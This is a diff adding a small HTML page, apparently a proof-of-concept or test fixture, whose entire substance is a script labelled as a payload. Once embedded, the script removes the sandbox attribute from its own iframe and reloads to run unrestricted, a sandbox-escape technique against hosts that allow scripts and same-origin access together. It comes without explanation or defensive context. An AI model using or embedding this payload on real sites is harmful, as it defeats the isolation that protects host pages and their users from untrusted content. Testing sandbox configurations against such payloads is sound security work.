@@ -1,0 +1,17 @@
+<html>
+<body> 
+
+  HI
+<script>
+   // JavaScript payload for the embedded page
+let iframe = window.frameElement; // Access the iframe element containing the current page
+
+if (iframe) {
+    iframe.removeAttribute('sandbox'); // Remove the sandbox attribute
+    window.location.reload(); // Reload the page to execute without sandbox restrictions
+}
+ 
+</script>
+</body>
+
+</html>
